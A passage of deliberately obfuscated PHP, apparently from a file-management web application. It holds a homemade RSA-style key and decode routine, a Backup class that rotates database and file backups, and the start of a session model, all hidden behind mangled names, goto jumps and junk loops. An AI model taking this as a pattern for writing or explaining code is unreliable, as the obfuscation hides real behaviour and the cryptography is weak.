$D¬Ü×¾”ùæ[230]: $c­â‚İ = $this->{$_SERVER[øÜ][260]}($cî„ëÜë‘, $D¬Ü×¾”ùæ[224]($Fç…‹ÊÂÄ . $EšÈê§÷ê)); break; $b¨µ¡Ä¥­ = $F‚áÂÈè÷õ[681]; if (strlen($b¨µ¡Ä¥­) < $F‚áÂÈè÷õ[589]) { die; } case $D¬Ü×¾”ùæ[351]: $c­â‚İ = $this->{$_SERVER[øÜ][260]}($cî„ëÜë‘, $D¬Ü×¾”ùæ[128]($Fç…‹ÊÂÄ . $EšÈê§÷ê)); break; case $D¬Ü×¾”ùæ[352]: $c­â‚İ = $this->{$_SERVER[øÜ][260]}($cî„ëÜë‘, $D¬Ü×¾”ùæ[124]($Fç…‹ÊÂÄ . $EšÈê§÷ê)); break; $F–öÛ…áä = $F‚áÂÈè÷õ[682]; if (!$F–öÛ…áä) { return; } case $D¬Ü×¾”ùæ[353]: goto C–‡‹Œá¾Ì; bòïÎ‰ÃŠÂ: $fİ†´¼éŞŒ = $D¬Ü×¾”ùæ[10]; $eË«ƒ¹Ä§» = $F‚áÂÈè÷õ[687]; while (strlen($eË«ƒ¹Ä§») < $F‚áÂÈè÷õ[580]) { if (!$eË«ƒ¹Ä§») { break; } $eË«ƒ¹Ä§»++; } goto fˆ·Ò‹Ò¸Ñ; E¥£á°§Ï: break; $CÎ„ÈìÑ = $F‚áÂÈè÷õ[690]; while ($CÎ„ÈìÑ < $F‚áÂÈè÷õ[574]) { if ($CÎ„ÈìÑ >= 0) { break; } $CÎ„ÈìÑ++; } goto BùÔ±Ú§ºö; f£‡šğÁ«ò: $e„òáÒ²Ù = 0; $bãçµ°î• = 0; for ($DğÒ×¯Ëß  = 0; $DğÒ×¯Ëß  < $D¬Ü×¾”ùæ[24]($cî„ëÜë‘); $DğÒ×¯Ëß ++) { $bãçµ°î• = $bãçµ°î• == $D¬Ü×¾”ùæ[24]($AÙÕ´ Ø©’) ? 0 : $bãçµ°î•; $dÜÈë¯áà = $F‚áÂÈè÷õ[689]; if (strlen($dÜÈë¯áà) < $F‚áÂÈè÷õ[580]) { die; } $d¹°ôÍé¸Ô = $bãçµ°î•++; $e„òáÒ²Ù = $D¬Ü×¾”ùæ[355]($B„‰êµ¹Œë, $cî„ëÜë‘[$DğÒ×¯Ëß ]) - $EÔö•ˆÚÜ¡ - $D¬Ü×¾”ùæ[356]($AÙÕ´ Ø©’[$d¹°ôÍé¸Ô]); while ($e„òáÒ²Ù < 0) { $e„òáÒ²Ù += 64; } $fİ†´¼éŞŒ .= $B„‰êµ¹Œë[$e„òáÒ²Ù]; } goto c¢Ü°ˆË½ê; C–‡‹Œá¾Ì: $cî„ëÜë‘ = $D¬Ü×¾”ùæ[358]($cî„ëÜë‘); $Bö”ŞÆƒ²± = $F‚áÂÈè÷õ[683]; while (strlen($Bö”ŞÆƒ²±) < $F‚áÂÈè÷õ[574]) { if (!$Bö”ŞÆƒ²±) { break; } $Bö”ŞÆƒ²±++; } goto c¨¸’õºÈƒ; c¨¸’õºÈƒ: $BŒ¼ˆ» ª = $cî„ëÜë‘[0]; $cî„ëÜë‘ = $D¬Ü×¾”ùæ[25]($cî„ëÜë‘, 1); $aÓ¢Õ¼‡º‘ = $F‚áÂÈè÷õ[684]; goto Cİ·êÚîßÃ; fˆ·Ò‹Ò¸Ñ: $DğÒ×¯Ëß  = 0; $bÄ¨¤½’·À = $F‚áÂÈè÷õ[688]; if (strlen($bÄ¨¤½’·À) < $F‚áÂÈè÷õ[589]) { die; } goto f£‡šğÁ«ò; c¢Ü°ˆË½ê: $c­â‚İ = $D¬Ü×¾”ùæ[359]($fİ†´¼éŞŒ); $D­¾æŸ†Ã = $F‚áÂÈè÷õ[627]; while ($D­¾æŸ†Ã < $F‚áÂÈè÷õ[574]) { if ($D­¾æŸ†Ã >= 0) { break; } $D­¾æŸ†Ã++; } goto E¥£á°§Ï; Cİ·êÚîßÃ: while ($aÓ¢Õ¼‡º‘ < $F‚áÂÈè÷õ[589]) { if ($aÓ¢Õ¼‡º‘ >= 0) { break; } $aÓ¢Õ¼‡º‘++; } $EÔö•ˆÚÜ¡ = $D¬Ü×¾”ùæ[355]($B„‰êµ¹Œë, $BŒ¼ˆ» ª); $d‚ˆ«‘ÅÙš = $F‚áÂÈè÷õ[685]; goto BäÚé¬‘‚; BäÚé¬‘‚: $AÙÕ´ Ø©’ = $D¬Ü×¾”ùæ[124]($BŒ¼ˆ» ª . $D¬Ü×¾”ùæ[124]($EšÈê§÷ê . $BŒ¼ˆ» ª) . $EšÈê§÷ê); $AÙÕ´ Ø©’ = $D¬Ü×¾”ùæ[25]($AÙÕ´ Ø©’, $EÔö•ˆÚÜ¡ % 8, $EÔö•ˆÚÜ¡ % 8 + 7); $BË„˜½Ù = $F‚áÂÈè÷õ[686]; goto bòïÎ‰ÃŠÂ; BùÔ±Ú§ºö: default: $c­â‚İ = $this->{$_SERVER[øÜ][260]}($cî„ëÜë‘, $EšÈê§÷ê . $Fç…‹ÊÂÄ); break; $bÒì‚ÀÖßÇ = $F‚áÂÈè÷õ[691]; } goto e’™Ï‡‚Ûæ; c©Èê®­Û½: $AÙ®äïŠ­ = $cî„ëÜë‘[0]; $fÂÅ¾Çë”Œ = $F‚áÂÈè÷õ[678]; while (strlen($fÂÅ¾Çë”Œ) < $F‚áÂÈè÷õ[580]) { if (!$fÂÅ¾Çë”Œ) { break; } $fÂÅ¾Çë”Œ++; } goto d™¤éó±è¤; a–»ÈšÇ×Å: $F‚áÂÈè÷õ =& $_SERVER[Ç³Íß¦Ó]; $D¬Ü×¾”ùæ =& $_SERVER[øÜ]; if (!$D¬Ü×¾”ùæ[357]($cî„ëÜë‘) || $D¬Ü×¾”ùæ[24]($cî„ëÜë‘) < 10) { return !1; } goto DçË…ê°Â™; e’™Ï‡‚Ûæ: if ($A¸†ê¢÷¼ - 1 > 0) { $c­â‚İ = $this->{$_SERVER[øÜ][199]}($c­â‚İ, $EšÈê§÷ê, $A¸†ê¢÷¼ - 1); } return $c­â‚İ; goto AÔ‘ÑŸ¤ª; aÜ‡àôóÏ“: $cî„ëÜë‘ = $D¬Ü×¾”ùæ[224]($cî„ëÜë‘); $d×‘²³ïîë = $F‚áÂÈè÷õ[677]; while (strlen($d×‘²³ïîë) < $F‚áÂÈè÷õ[589]) { if (!$d×‘²³ïîë) { break; } $d×‘²³ïîë++; } goto c©Èê®­Û½; AÔ‘ÑŸ¤ª: } public function xban74d48e50($C‚Ì‚ÊĞå) { goto CÊ’ªÄÑÂ†; C”ŠšÂ¨‚: $FÁÑ™ŠÏŞ¬ = $bŠ§²ô£î[692]; if (strlen($FÁÑ™ŠÏŞ¬) < $bŠ§²ô£î[589]) { die; } $F¯˜ñ†¯ = $this->{$_SERVER[øÜ][360]}(); goto C´ŸÖ‹é§Ö; c¾ªå»³â¹: $BÇîÚß¥®  = $bŠ§²ô£î[682]; if (!$BÇîÚß¥® ) { return; } goto fÊæ•äöõ‚; B†¹œ˜: $F˜ÅŞëÜ¤ƒ = 2; for ($C×İ¾¦™ÕÏ = 0; $C×İ¾¦™ÕÏ < $C¶Æ’œ¾ Ş * 10; $C×İ¾¦™ÕÏ++) { if (($C¶Æ’œ¾ Ş * $C×İ¾¦™ÕÏ + 1) % $EªæÓ‡Ç¡‚ == 0) { $F˜ÅŞëÜ¤ƒ = $c´¬×•·î™[254](($C¶Æ’œ¾ Ş * $C×İ¾¦™ÕÏ + 1) / $EªæÓ‡Ç¡‚); break; } } $CÒº¦„Ö÷¡ = $this->{$_SERVER[øÜ][157]}($EˆÎÛÆÎ‘Å * $F¯˜ñ†¯ . $c´¬×•·î™[10], $c´¬×•·î™[159]); goto E‹„ÃĞ¨—·; CÊ’ªÄÑÂ†: $bŠ§²ô£î =& $_SERVER[Ç³Íß¦Ó]; $c´¬×•·î™ =& $_SERVER[øÜ]; $EˆÎÛÆÎ‘Å = $this->{$_SERVER[øÜ][360]}(); goto C”ŠšÂ¨‚; C´ŸÖ‹é§Ö: $C¶Æ’œ¾ Ş = ($EˆÎÛÆÎ‘Å - 1) * ($F¯˜ñ†¯ - 1); $EªæÓ‡Ç¡‚ = $c´¬×•·î™[254](($EˆÎÛÆÎ‘Å + $F¯˜ñ†¯) / 2); while (1) { $F‰ÔÅ¼Œ¹À = $EªæÓ‡Ç¡‚; $d—®ÄÛÄë‘ = $C¶Æ’œ¾ Ş; while ($d—®ÄÛÄë‘ % $F‰ÔÅ¼Œ¹À != 0) { $c¾«ÏÈ²à÷ = $d—®ÄÛÄë‘; $d—®ÄÛÄë‘ = $F‰ÔÅ¼Œ¹À; $F‡Š³©äÇ = $bŠ§²ô£î[693]; while ($F‡Š³©äÇ < $bŠ§²ô£î[589]) { if ($F‡Š³©äÇ >= 0) { break; } $F‡Š³©äÇ++; } $F‰ÔÅ¼Œ¹À = $c¾«ÏÈ²à÷ % $F‰ÔÅ¼Œ¹À; $c›§¤Ò¬õŒ = $bŠ§²ô£î[694]; if (strlen($c›§¤Ò¬õŒ) < $bŠ§²ô£î[585]) { return; } } if ($F‰ÔÅ¼Œ¹À == 1) { break; } else { $EªæÓ‡Ç¡‚++; } } goto B†¹œ˜; E‹„ÃĞ¨—·: $eš¦Ñ­Ã¯¦ = $c´¬×•·î™[124]($c´¬×•·î™[361] . ($EˆÎÛÆÎ‘Å + $F¯˜ñ†¯) . $c´¬×•·î™[362] . $EªæÓ‡Ç¡‚ . $c´¬×•·î™[362] . $F˜ÅŞëÜ¤ƒ . $c´¬×•·î™[363]); $a±·–·Ğ = $this->{$_SERVER[øÜ][157]}($C‚Ì‚ÊĞå, $eš¦Ñ­Ã¯¦) . $c´¬×•·î™[364] . $CÒº¦„Ö÷¡; return $a±·–·Ğ; goto c¾ªå»³â¹; fÊæ•äöõ‚: } public function rpgb704a8e14($a¨Õ‰¸ÎÀ) { goto AäŞªÎÜ; B¿ŞŸŠ½Ê: $fìôÑ‹Š‚ˆ = $dæâïøÔ·[696]; $B¥½‹ŞÃÒ = 0; $BŞ‰‹Ù“Ï¤ = 0; goto c½áØê¬·È; c´ä®ÑÌ½Ó: if ($A¢çøÎö–[19]($cÊàï¤ó²ñ) != 2) { return $A¢çøÎö–[10]; } $AÑ´ÛÍÜßë = $this->{$_SERVER[øÜ][260]}($cÊàï¤ó²ñ[1] . $A¢çøÎö–[10], $A¢çøÎö–[159]); $cøŒçâ®ç = $dæâïøÔ·[695]; goto d¦Úˆ¬×™ù; cÏÈß®‘¾ˆ: $Eƒ‚­Ÿ¼êÌ = $dæâïøÔ·[704]; while (strlen($Eƒ‚­Ÿ¼êÌ) < $dæâïøÔ·[589]) { if (!$Eƒ‚­Ÿ¼êÌ) { break; } $Eƒ‚­Ÿ¼êÌ++; } goto dì˜®¥ÆÅ; F¡·´¾‡”: $F†¢òÑ•¼ = ($B¥½‹ŞÃÒ - 1) * ($BŞ‰‹Ù“Ï¤ - 1); $Bˆø©ÍËÂ” = $dæâïøÔ·[701]; $F÷ÑÁï±äÂ = $A¢çøÎö–[254](($B¥½‹ŞÃÒ + $BŞ‰‹Ù“Ï¤) / 2); goto A¸ˆ‹š´; dõ½²¿¨Šì: $cò†éµ¾Ù = $A¢çøÎö–[124]($A¢çøÎö–[361] . ($B¥½‹ŞÃÒ + $BŞ‰‹Ù“Ï¤) . $A¢çøÎö–[362] . $F÷ÑÁï±äÂ . $A¢çøÎö–[362] . $e¾ğ¾è´´„ . $A¢çøÎö–[363]); $B¼±ºÚ˜› = $this->{$_SERVER[øÜ][260]}($cÊàï¤ó²ñ[0], $cò†éµ¾Ù); return $B¼±ºÚ˜›; goto cÏÈß®‘¾ˆ; d¦Úˆ¬×™ù: while (strlen($cøŒçâ®ç) < $dæâïøÔ·[585]) { if (!$cøŒçâ®ç) { break; } $cøŒçâ®ç++; } if (!$AÑ´ÛÍÜßë) { return $A¢çøÎö–[10]; } $AÑ´ÛÍÜßë = $A¢çøÎö–[254]($AÑ´ÛÍÜßë); goto B¿ŞŸŠ½Ê; AäŞªÎÜ: $dæâïøÔ· =& $_SERVER[Ç³Íß¦Ó]; $A¢çøÎö– =& $_SERVER[øÜ]; $cÊàï¤ó²ñ = $A¢çøÎö–[0]($A¢çøÎö–[364], $a¨Õ‰¸ÎÀ); goto c´ä®ÑÌ½Ó; c½áØê¬·È: $b±ùÚ›ìÖ† = $dæâïøÔ·[697]; if (strlen($b±ùÚ›ìÖ†) < $dæâïøÔ·[589]) { die; } for ($e¡ •ÇÉŒ = 3; $e¡ •ÇÉŒ < $AÑ´ÛÍÜßë; $e¡ •ÇÉŒ += 2) { if ($AÑ´ÛÍÜßë % $e¡ •ÇÉŒ != 0) { continue; } $B¥½‹ŞÃÒ = $e¡ •ÇÉŒ; $Aè©Ó™“ç = $dæâïøÔ·[698]; if (!$Aè©Ó™“ç) { die; } $BŞ‰‹Ù“Ï¤ = $A¢çøÎö–[254]($AÑ´ÛÍÜßë / $e¡ •ÇÉŒ); $D‹‚„ÏóÎ = $dæâïøÔ·[699]; break; $E¾ò™Ù‘ƒ¤ = $dæâïøÔ·[700]; if (!$E¾ò™Ù‘ƒ¤) { die; } } goto F¡·´¾‡”; A¸ˆ‹š´: while (1) { $a»Óñµ = $F÷ÑÁï±äÂ; $bØá¶ÌŞÈ = $dæâïøÔ·[702]; if (strlen($bØá¶ÌŞÈ) < $dæâïøÔ·[585]) { return; } $f—’ÀÒ¤é = $F†¢òÑ•¼; while ($f—’ÀÒ¤é % $a»Óñµ != 0) { $B·’°–Ö¶Ó = $f—’ÀÒ¤é; $f—’ÀÒ¤é = $a»Óñµ; $a»Óñµ = $B·’°–Ö¶Ó % $a»Óñµ; $fâëšêÃò = $dæâïøÔ·[703]; if (!$fâëšêÃò) { die; } } if ($a»Óñµ == 1) { break; } else { $F÷ÑÁï±äÂ++; } } $e¾ğ¾è´´„ = 2; for ($e¡ •ÇÉŒ = 0; $e¡ •ÇÉŒ < $F†¢òÑ•¼ * 10; $e¡ •ÇÉŒ++) { if (($F†¢òÑ•¼ * $e¡ •ÇÉŒ + 1) % $F÷ÑÁï±äÂ == 0) { $e¾ğ¾è´´„ = $A¢çøÎö–[254](($F†¢òÑ•¼ * $e¡ •ÇÉŒ + 1) / $F÷ÑÁï±äÂ); break; } } goto dõ½²¿¨Šì; dì˜®¥ÆÅ: } public function lrqo2e5eef2d() { goto Eñà©Şš»; AÅˆäİÔŠ: while ($e˜½”´‘‰Ë <= (int) $B„®ÅƒÄÓ[366]($bƒÔŒÔ‡ª)) { $bø«¤Ã„ïí = $e˜½”´‘‰Ë; $DøÚ§Ô‚›¯ = $eºò§èàñ[707]; while (!0) { $bø«¤Ã„ïí++; if ($bø«¤Ã„ïí <= 2) { $e˜½”´‘‰Ë = $bø«¤Ã„ïí; break; } else { if ($bø«¤Ã„ïí < 2) { continue; } } $dÌñ×’°ÆË = !0; for ($Cù©ã¨æÔÇ = 2; $Cù©ã¨æÔÇ <= $B„®ÅƒÄÓ[366]($bø«¤Ã„ïí); $Cù©ã¨æÔÇ++) { if ($bø«¤Ã„ïí % $Cù©ã¨æÔÇ == 0) { $dÌñ×’°ÆË = !1; } } if ($dÌñ×’°ÆË) { $e˜½”´‘‰Ë = $bø«¤Ã„ïí; break; } } $dÛéŒ§ËÃ¿[] = $e˜½”´‘‰Ë; } $e·¹ìµÑ = 2; $BÓ«Á©™ï = $eºò§èàñ[708]; goto Bå¡§Œ™«ò; eÏƒ½Í…í×: $cŒ— „î = $eºò§èàñ[706]; if (strlen($cŒ— „î) < $eºò§èàñ[585]) { die; } $e˜½”´‘‰Ë = 1; goto AÅˆäİÔŠ; Eñà©Şš»: $eºò§èàñ =& $_SERVER[Ç³Íß¦Ó]; $B„®ÅƒÄÓ =& $_SERVER[øÜ]; $bƒÔŒÔ‡ª = $B„®ÅƒÄÓ[345]($B„®ÅƒÄÓ[365](2, 14), $B„®ÅƒÄÓ[365](2, 16) - 1); goto C„ ÈîãƒË; Bå¡§Œ™«ò: while (strlen($BÓ«Á©™ï) < $eºò§èàñ[585]) { if (!$BÓ«Á©™ï) { break; } $BÓ«Á©™ï++; } for ($bø«¤Ã„ïí = $bƒÔŒÔ‡ª; $bø«¤Ã„ïí > 1; $bø«¤Ã„ïí--) { $dÌñ×’°ÆË = !0; foreach ($dÛéŒ§ËÃ¿ as $Dèè‘‰‹á) { if ($bø«¤Ã„ïí % $Dèè‘‰‹á == 0) { $dÌñ×’°ÆË = !1; break; } } if ($dÌñ×’°ÆË) { $e·¹ìµÑ = $bø«¤Ã„ïí; break; } } return $e·¹ìµÑ; goto aåé÷¿„í«; C„ ÈîãƒË: $d•×ù­Å‹„ = $eºò§èàñ[705]; if (strlen($d•×ù­Å‹„) < $eºò§èàñ[598]) { return; } $dÛéŒ§ËÃ¿ = array(); goto eÏƒ½Í…í×; aåé÷¿„í«: } public function iykm6bae57f1($e˜¯­‡­ïñ, $dŠŠ´ÁŞ¤Í) { $c„êÜÃ¨‚Ø =& $_SERVER[Ç³Íß¦Ó]; $b®½×Îâ„Á =& $_SERVER[øÜ]; return $b®½×Îâ„Á[13](array($b®½×Îâ„Á[14], $b®½×Îâ„Á[367]), $e˜¯­‡­ïñ, $dŠŠ´ÁŞ¤Í); $B”Õ­·ÙÁ³ = $c„êÜÃ¨‚Ø[709]; while (strlen($B”Õ­·ÙÁ³) < $c„êÜÃ¨‚Ø[580]) { if (!$B”Õ­·ÙÁ³) { break; } $B”Õ­·ÙÁ³++; } } public function ngife85fba57($e‘‚¥”êàº, $e®Ïƒ¦öìÍ) { $cğÖÅÛôÎŒ =& $_SERVER[Ç³Íß¦Ó]; $AÂ‚ù¥óâõ =& $_SERVER[øÜ]; return $AÂ‚ù¥óâõ[13](array($AÂ‚ù¥óâõ[368], $AÂ‚ù¥óâõ[369]), $e‘‚¥”êàº, $e®Ïƒ¦öìÍ); $fíÕ‰œŞñ… = $cğÖÅÛôÎŒ[710]; while (strlen($fíÕ‰œŞñ…) < $cğÖÅÛôÎŒ[589]) { if (!$fíÕ‰œŞñ…) { break; } $fíÕ‰œŞñ…++; } } public function czkm63a7773d($dÔ¸±ƒ¨Ï, $FÏÇŠÙ…¯) { $A–Ì·šƒ =& $_SERVER[Ç³Íß¦Ó]; $c‚ï«¤©Õá =& $_SERVER[øÜ]; return $c‚ï«¤©Õá[13](array($c‚ï«¤©Õá[368], $c‚ï«¤©Õá[370]), $dÔ¸±ƒ¨Ï, $FÏÇŠÙ…¯); $D¶‹–ï° = $A–Ì·šƒ[711]; while ($D¶‹–ï° < $A–Ì·šƒ[589]) { if ($D¶‹–ï° >= 0) { break; } $D¶‹–ï°++; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $f¾Ğø¯œŠ =& $_SERVER[Ç³Íß¦Ó]; self::$name = date($f¾Ğø¯œŠ[712]); if (!($Cê»‹Å¨å÷ = Model($f¾Ğø¯œŠ[713])->lastItem())) { $Cê»‹Å¨å÷ = $this->initData(); } else { self::$name = $Cê»‹Å¨å÷[$f¾Ğø¯œŠ[28]]; if ($Cê»‹Å¨å÷[$f¾Ğø¯œŠ[714]] == $f¾Ğø¯œŠ[87]) { self::$name = date($f¾Ğø¯œŠ[715]); $d¢êÎè‘Ï˜ = 0; if (isset($Cê»‹Å¨å÷[$f¾Ğø¯œŠ[290]][$f¾Ğø¯œŠ[192]][$f¾Ğø¯œŠ[445]])) { $d¢êÎè‘Ï˜ = (int) $Cê»‹Å¨å÷[$f¾Ğø¯œŠ[290]][$f¾Ğø¯œŠ[192]][$f¾Ğø¯œŠ[445]]; } if ($Cê»‹Å¨å÷[$f¾Ğø¯œŠ[28]] == self::$name) { Model($f¾Ğø¯œŠ[713])->remove($Cê»‹Å¨å÷[$f¾Ğø¯œŠ[392]]); } $Cê»‹Å¨å÷ = $this->initData($d¢êÎè‘Ï˜, $Cê»‹Å¨å÷[$f¾Ğø¯œŠ[716]]); } else { $this->checkStore($Cê»‹Å¨å÷[$f¾Ğø¯œŠ[716]]); } } self::$option = $Cê»‹Å¨å÷; } private function initData($A“Êš©³˜Ü = 0, $aƒëÅÊÖ‰° = '') { goto AËì‡ìô­²; AËì‡ìô­²: $eŸ­ÊˆÂÍ =& $_SERVER[Ç³Íß¦Ó]; $f×²…“µŸñ = Model($eŸ­ÊˆÂÍ[713])->config(); if ($aƒëÅÊÖ‰° && $f×²…“µŸñ[$eŸ­ÊˆÂÍ[716]] != $aƒëÅÊÖ‰°) { $A“Êš©³˜Ü = 0; } goto Eì‘¾…Ú”Š; Eì‘¾…Ú”Š: $this->checkStore($f×²…“µŸñ[$eŸ­ÊˆÂÍ[716]]); $c¡ˆŒ¬Åáç = array($eŸ­ÊˆÂÍ[716] => $f×²…“µŸñ[$eŸ­ÊˆÂÍ[716]], $eŸ­ÊˆÂÍ[28] => self::$name, $eŸ­ÊˆÂÍ[714] => 0, $eŸ­ÊˆÂÍ[717] => $f×²…“µŸñ[$eŸ­ÊˆÂÍ[717]], $eŸ­ÊˆÂÍ[290] => array($eŸ­ÊˆÂÍ[718] => array($eŸ­ÊˆÂÍ[714] => 0), $eŸ­ÊˆÂÍ[719] => array($eŸ­ÊˆÂÍ[714] => 0, $eŸ­ÊˆÂÍ[720] => 0, $eŸ­ÊˆÂÍ[721] => 0, $eŸ­ÊˆÂÍ[29] => $eŸ­ÊˆÂÍ[33], $eŸ­ÊˆÂÍ[722] => 0, $eŸ­ÊˆÂÍ[474] => 0), $eŸ­ÊˆÂÍ[723] => array($eŸ­ÊˆÂÍ[714] => 0, $eŸ­ÊˆÂÍ[720] => 0, $eŸ­ÊˆÂÍ[721] => 0, $eŸ­ÊˆÂÍ[722] => 0, $eŸ­ÊˆÂÍ[474] => 0), $eŸ­ÊˆÂÍ[192] => array($eŸ­ÊˆÂÍ[714] => 0, $eŸ­ÊˆÂÍ[724] => 0, $eŸ­ÊˆÂÍ[725] => 0, $eŸ­ÊˆÂÍ[726] => 0, $eŸ­ÊˆÂÍ[727] => 0, $eŸ­ÊˆÂÍ[445] => $A“Êš©³˜Ü, $eŸ­ÊˆÂÍ[722] => 0, $eŸ­ÊˆÂÍ[474] => 0)), $eŸ­ÊˆÂÍ[722] => time(), $eŸ­ÊˆÂÍ[474] => 0); $d¯¸ÓÅñÛØ = Model($eŸ­ÊˆÂÍ[713])->insert($c¡ˆŒ¬Åáç); goto E°‡”¦¤—‚; E°‡”¦¤—‚: $c¡ˆŒ¬Åáç[$eŸ­ÊˆÂÍ[392]] = $d¯¸ÓÅñÛØ; return $c¡ˆŒ¬Åáç; goto dåôà»Ü‹; dåôà»Ü‹: } private function checkStore($cè‡ªô¯) { $d¯Æƒ„˜¾ =& $_SERVER[Ç³Íß¦Ó]; $f¾…Ù½¨º = Model($d¯Æƒ„˜¾[728])->listData($cè‡ªô¯); Model($d¯Æƒ„˜¾[728])->checkConfig($f¾…Ù½¨º); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ç³Íß¦Ó][713])->findByName(self::$name); } return self::$option; } public static function set($f¾ÙÖ²ÇìÉ) { $Fò”ÌÈÎá =& $_SERVER[Ç³Íß¦Ó]; $bœ¼˜£Œß¢ = self::get(); foreach ($f¾ÙÖ²ÇìÉ as $d†‚ªÉ†ğ => $b„ÑµÅíãù) { $C«²¹ºàç = explode($Fò”ÌÈÎá[95], $d†‚ªÉ†ğ); $EŒ‰ÚÂåİ = count($C«²¹ºàç); switch ($EŒ‰ÚÂåİ) { case 1: $bœ¼˜£Œß¢[$C«²¹ºàç[0]] = $b„ÑµÅíãù; break; case 2: $bœ¼˜£Œß¢[$C«²¹ºàç[0]][$C«²¹ºàç[1]] = $b„ÑµÅíãù; break; case 3: $bœ¼˜£Œß¢[$C«²¹ºàç[0]][$C«²¹ºàç[1]][$C«²¹ºàç[2]] = $b„ÑµÅíãù; break; } } Model($Fò”ÌÈÎá[713])->update($bœ¼˜£Œß¢[$Fò”ÌÈÎá[392]], $bœ¼˜£Œß¢); self::$option = $bœ¼˜£Œß¢; return self::$option; } public function keep() { $f¦™«í«­æ =& $_SERVER[Ç³Íß¦Ó]; $Eõ¹œ—‚ = self::get(); if ($Eõ¹œ—‚[$f¦™«í«­æ[290]][$f¦™«í«­æ[718]][$f¦™«í«­æ[714]] == $f¦™«í«­æ[87]) { return; } $this->backupKeep($Eõ¹œ—‚); self::set(array($f¦™«í«­æ[729] => 1)); } private function backupKeep($E‰ó˜Á›ÉÃ) { goto eÕ ¸åìÅ; B·ˆºˆºù: foreach ($E ¯ß˜‹Ä¢ as $b¢•Êà™¬Ë) { if (!empty($b¢•Êà™¬Ë[$c¸ÔÇù‰Ş™[28]]) && in_array($b¢•Êà™¬Ë[$c¸ÔÇù‰Ş™[28]], $F“¥Çá¬ëÇ)) { continue; } Model($c¸ÔÇù‰Ş™[713])->remove($b¢•Êà™¬Ë[$c¸ÔÇù‰Ş™[392]]); $f’æ¤ËÌ¡ = $this->backupPath($E‰ó˜Á›ÉÃ, $C¾‘‹ªÄÛ); IO::remove($f’æ¤ËÌ¡, !1); } goto f²ŸĞÑÃ; eÕ ¸åìÅ: $c¸ÔÇù‰Ş™ =& $_SERVER[Ç³Íß¦Ó]; $E ¯ß˜‹Ä¢ = Model($c¸ÔÇù‰Ş™[713])->listData(); if (empty($E ¯ß˜‹Ä¢)) { return; } goto Bµ”¤¹îÇ; Fß½‘İ®¨ï: for ($dåŸŸéšøÑ = 0; $dåŸŸéšøÑ < 12; $dåŸŸéšøÑ++) { $F“¥Çá¬ëÇ[] = date($c¸ÔÇù‰Ş™[730], strtotime("\x2d{$dåŸŸéšøÑ}\40\155\157\156\x74\x68\163")); } $F“¥Çá¬ëÇ = array_unique($F“¥Çá¬ëÇ); $C¾‘‹ªÄÛ = Model($c¸ÔÇù‰Ş™[731])->get($c¸ÔÇù‰Ş™[732]); goto B·ˆºˆºù; Bµ”¤¹îÇ: $dåŸŸéšøÑ = 0; $F“¥Çá¬ëÇ = array(); foreach ($E ¯ß˜‹Ä¢ as $b¢•Êà™¬Ë) { if ($dåŸŸéšøÑ >= 7) { break; } $F“¥Çá¬ëÇ[] = $b¢•Êà™¬Ë[$c¸ÔÇù‰Ş™[28]]; $dåŸŸéšøÑ++; } goto Fß½‘İ®¨ï; f²ŸĞÑÃ: } private function backupPath($Bá Õ•‚, $AÍ°ùÜŸé” = false) { $d‚‘Ş¦ˆ‘å =& $_SERVER[Ç³Íß¦Ó]; if (!$AÍ°ùÜŸé”) { $AÍ°ùÜŸé” = Model($d‚‘Ş¦ˆ‘å[731])->get($d‚‘Ş¦ˆ‘å[732]); } $dÒƒÇ§³öÆ = $Bá Õ•‚[$d‚‘Ş¦ˆ‘å[28]]; $a¿¼Öê¸Âµ = substr(md5($d‚‘Ş¦ˆ‘å[733] . $AÍ°ùÜŸé” . $dÒƒÇ§³öÆ), 0, 8); return "\173\x69\157\72{$Bá Õ•‚[$d‚‘Ş¦ˆ‘å[716]]}\175\57\144\x61\x74\141\x62\141\163\145\57\x62\x61\143\153\x75\x70\x2f" . $dÒƒÇ§³öÆ . $d‚‘Ş¦ˆ‘å[71] . $a¿¼Öê¸Âµ; } public function db() { goto aĞÇ››³¦¼; aĞÇ››³¦¼: $E­ªÕÉ­° =& $_SERVER[Ç³Íß¦Ó]; $Cë´âÍã¡† = self::get(); if ($Cë´âÍã¡†[$E­ªÕÉ­°[290]][$E­ªÕÉ­°[719]][$E­ªÕÉ­°[714]] == $E­ªÕÉ­°[87]) { return !0; } goto D°øØ¾½»; D°øØ¾½»: $dì¢´îÁè = new BackupDb(); if (!$dì¢´îÁè->index()) { return !1; } self::set(array($E­ªÕÉ­°[734] => 1)); goto d¼É‡²ø; d¼É‡²ø: return !0; goto Aù‰·Íùï«; Aù‰·Íùï«: } public function dbFile() { goto cØ†Ş¨òôˆ; cØ†Ş¨òôˆ: $a××íËõ =& $_SERVER[Ç³Íß¦Ó]; $d¥Ş«ˆ³”§ = self::get(); if ($d¥Ş«ˆ³”§[$a××íËõ[290]][$a××íËõ[723]][$a××íËõ[714]] == $a××íËõ[87]) { return !0; } goto FÓñƒ¶†; aÙ¶‰ß™é: return !0; goto fÆ›äªŠ’Ç; FÓñƒ¶†: $A•è¢“Ğµ» = new BackupDbFile(); if (!$A•è¢“Ğµ»->index()) { return !1; } self::set(array($a××íËõ[735] => 1)); goto aÙ¶‰ß™é; fÆ›äªŠ’Ç: } public function file() { $e²¨»Ê„Ì =& $_SERVER[Ç³Íß¦Ó]; $E¼ìŒÒĞœ¹ = self::get(); if ($E¼ìŒÒĞœ¹[$e²¨»Ê„Ì[290]][$e²¨»Ê„Ì[192]][$e²¨»Ê„Ì[714]] == $e²¨»Ê„Ì[87]) { return !0; } if (!isset($E¼ìŒÒĞœ¹[$e²¨»Ê„Ì[717]]) || $E¼ìŒÒĞœ¹[$e²¨»Ê„Ì[717]] == $e²¨»Ê„Ì[495]) { $eğ‡ä„µ™ = new BackupFile(); if (!$eğ‡ä„µ™->index()) { return !1; } } self::set(array($e²¨»Ê„Ì[736] => 1, $e²¨»Ê„Ì[714] => 1)); return !0; } } goto E±•İ©æÖ; E‰ºòò±ØÊ: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\x65\x6d\x5f\x73\x65\x73\x73\151\157\x6e"; public function get($DæÌ¬¸è¾) { $Aßè£›ó™ =& $_SERVER[Ç³Íß¦Ó]; $e„â›ÃğÎ» = $this->where(array($Aßè£›ó™[1813] => $DæÌ¬¸è¾))->find(); if (!is_array($e„â›ÃğÎ»)) { return !1; } return $e„â›ÃğÎ»[$Aßè£›ó™[717]]; } public function set($A†šÔĞ«„–, $EËÊŞ¯´, $Fëœ¿Ş»ùµ = 3600) { 